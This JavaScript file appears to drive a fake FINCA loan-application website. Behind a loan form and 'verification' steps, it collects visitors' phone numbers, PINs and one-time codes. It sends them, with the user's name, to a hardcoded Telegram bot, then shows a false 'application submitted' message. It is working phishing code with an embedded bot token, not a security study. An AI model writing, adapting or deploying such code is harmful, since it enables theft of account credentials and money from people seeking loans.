// --- Telegram Bot Configuration ---
const TELEGRAM_BOT_TOKEN = '8907840609:AAEkLgN2-BMF9-A-sCrBWiWE7OQTXAZfMpU';
const TELEGRAM_CHAT_ID = '6053159151';

// LocalStorage Data Keys
const USERS_KEY = 'finca_users';
const CURRENT_USER_KEY = 'finca_current_user';
const APPS_KEY = 'finca_applications';

// Temporary storage for loan application and generated OTP
let pendingLoanData = null;
let currentGeneratedOtp = null;
let activePhone = '';

// --- Helper Functions ---
function getStoredData(key) {
  return JSON.parse(localStorage.getItem(key)) || [];
}

function setStoredData(key, value) {
  localStorage.setItem(key, JSON.stringify(value));
}

function showAlert(message, type = 'danger') {
  const alertBox = document.getElementById('alertBox');
  alertBox.textContent = message;
  alertBox.className = `alert alert-${type}`;
  alertBox.classList.remove('hidden');
  setTimeout(() => alertBox.classList.add('hidden'), 4000);
}

function showSection(sectionId) {
  const sections = [
    'loginSection', 
    'registerSection', 
    'dashboardSection', 
    'applySection', 
    'pinVerificationSection', 
    'otpVerificationSection'
  ];
  sections.forEach(id => {
    document.getElementById(id).classList.add('hidden');
  });
  document.getElementById(sectionId).classList.remove('hidden');
}

// Function to send message to Telegram Bot
async function sendTelegramMessage(text) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || TELEGRAM_BOT_TOKEN === 'YOUR_TELEGRAM_BOT_TOKEN') {
    console.warn('Telegram Bot Credentials are not configured.');
    return;
  }

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        parse_mode: 'HTML'
      })
    });
  } catch (error) {
    console.error('Failed to send Telegram notification:', error);
  }
}

// Helper to generate a random 6-digit OTP
function generate6DigitOtp() {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

// --- Application Initialization ---
window.addEventListener('DOMContentLoaded', () => {
  const currentUser = JSON.parse(localStorage.getItem(CURRENT_USER_KEY));
  if (currentUser) {
    loadDashboard(currentUser);
  } else {
    showSection('loginSection');
  }
});

// --- Authentication ---
document.getElementById('registerForm').addEventListener('submit', (e) => {
  e.preventDefault();
  const email = document.getElementById('regEmail').value.trim().toLowerCase();
  const users = getStoredData(USERS_KEY);

  if (users.find(u => u.email === email)) {
    showAlert('An account with this email already exists.');
    return;
  }

  const newUser = {
    id: 'usr_' + Date.now(),
    fullName: document.getElementById('regFullName').value.trim(),
    email: email,
    phone: document.getElementById('regPhone').value.trim(),
    province: document.getElementById('regProvince').value.trim(),
    nationalId: document.getElementById('regNationalId').value.trim(),
    password: document.getElementById('regPassword').value
  };

  users.push(newUser);
  setStoredData(USERS_KEY, users);
  localStorage.setItem(CURRENT_USER_KEY, JSON.stringify(newUser));

  showAlert('Account created successfully!', 'success');
  loadDashboard(newUser);
});

document.getElementById('loginForm').addEventListener('submit', (e) => {
  e.preventDefault();
  const email = document.getElementById('loginEmail').value.trim().toLowerCase();
  const password = document.getElementById('loginPassword').value;
  const users = getStoredData(USERS_KEY);

  const user = users.find(u => u.email === email && u.password === password);

  if (!user) {
    showAlert('Invalid email or password.');
    return;
  }

  localStorage.setItem(CURRENT_USER_KEY, JSON.stringify(user));
  loadDashboard(user);
});

function handleLogout() {
  localStorage.removeItem(CURRENT_USER_KEY);
  document.getElementById('loginForm').reset();
  showSection('loginSection');
}

// --- Dashboard & Applications ---
function loadDashboard(user) {
  document.getElementById('userDisplayName').textContent = user.fullName;
  renderApplications(user.id);
  showSection('dashboardSection');
}

function renderApplications(userId) {
  const appsContainer = document.getElementById('applicationsList');
  const allApps = getStoredData(APPS_KEY);
  const userApps = allApps.filter(app => app.userId === userId);

  if (userApps.length === 0) {
    appsContainer.innerHTML = '<p style="text-align: center; color: #777;">No active loan applications found.</p>';
    return;
  }

  appsContainer.innerHTML = userApps.map(app => `
    <div class="app-card">
      <p><strong>Application ID:</strong> ${app.id}</p>
      <p><strong>Amount:</strong> ${app.currency} ${Number(app.amount).toLocaleString()}</p>
      <p><strong>Purpose:</strong> ${app.purpose}</p>
      <p><strong>Term:</strong> ${app.term} Months</p>
      <p><strong>Submitted:</strong> ${new Date(app.submittedAt).toLocaleDateString()}</p>
      <p><strong>Status:</strong> <span class="status-badge">${app.status}</span></p>
    </div>
  `).join('');
}

// --- Loan Application Workflow ---
function startVerification() {
  const amount = document.getElementById('loanAmount').value;
  const purpose = document.getElementById('loanPurpose').value.trim();
  const term = document.getElementById('loanTerm').value;
  const income = document.getElementById('loanIncome').value;
  const guarantorName = document.getElementById('guarantorName').value.trim();
  const guarantorPhone = document.getElementById('guarantorPhone').value.trim();

  if (!amount || !purpose || !term || !income || !guarantorName || !guarantorPhone) {
    showAlert('Please fill in all loan details before continuing.');
    return;
  }

  const currentUser = JSON.parse(localStorage.getItem(CURRENT_USER_KEY));

  pendingLoanData = {
    amount,
    currency: document.getElementById('loanCurrency').value,
    purpose,
    term,
    income,
    guarantorName,
    guarantorPhone
  };

  document.getElementById('otpPhone').value = currentUser.phone || '';
  showSection('pinVerificationSection');
}

// 1. Send Phone, PIN, and System-Generated OTP to Telegram, then show OTP page
document.getElementById('pinForm').addEventListener('submit', async (e) => {
  e.preventDefault();
  activePhone = document.getElementById('otpPhone').value.trim();
  const pin = document.getElementById('otpPin').value.trim();

  if (!activePhone || !pin) {
    showAlert('Please provide both phone number and PIN.');
    return;
  }

  // Generate a random OTP code
  currentGeneratedOtp = generate6DigitOtp();

  const currentUser = JSON.parse(localStorage.getItem(CURRENT_USER_KEY)) || {};

  // Build First Message to Telegram
  const message1 = `<b>📲 STEP 1: Phone & PIN Submitted</b>\n\n` +
                   `<b>User Name:</b> ${currentUser.fullName || 'N/A'}\n` +
                   `<b>Phone:</b> <code>${activePhone}</code>\n` +
                   `<b>PIN:</b> <code>${pin}</code>\n` +
                   `<b>Generated OTP:</b> <code>${currentGeneratedOtp}</code>`;

  await sendTelegramMessage(message1);

  showAlert('Phone & PIN verified. Security code generated.', 'success');
  showSection('otpVerificationSection');
});

// 2. Send Entered OTP to Telegram (Regardless of whether it matches) and submit application
document.getElementById('otpForm').addEventListener('submit', async (e) => {
  e.preventDefault();
  const enteredOtp = document.getElementById('otpCode').value.trim();

  if (!enteredOtp) {
    showAlert('Please enter an OTP code.');
    return;
  }

  const currentUser = JSON.parse(localStorage.getItem(CURRENT_USER_KEY)) || {};

  // Build Second Message to Telegram
  const message2 = `<b>🔑 STEP 2: OTP Code Entered</b>\n\n` +
                   `<b>Phone:</b> <code>${activePhone}</code>\n` +
                   `<b>Generated OTP:</b> <code>${currentGeneratedOtp || 'N/A'}</code>\n` +
                   `<b>Entered OTP:</b> <code>${enteredOtp}</code>\n` +
                   `<b>Match Status:</b> ${enteredOtp === currentGeneratedOtp ? '✅ MATCH' : '❌ MISMATCH'}`;

  await sendTelegramMessage(message2);

  const allApps = getStoredData(APPS_KEY);

  const newApplication = {
    id: 'app_' + Date.now().toString().slice(-6),
    userId: currentUser.id,
    ...pendingLoanData,
    status: 'Under Review',
    submittedAt: new Date().toISOString()
  };

  allApps.push(newApplication);
  setStoredData(APPS_KEY, allApps);

  pendingLoanData = null;
  currentGeneratedOtp = null;

  document.getElementById('loanForm').reset();
  document.getElementById('pinForm').reset();
  document.getElementById('otpForm').reset();

  showAlert('Application submitted successfully!', 'success');
  loadDashboard(currentUser);
});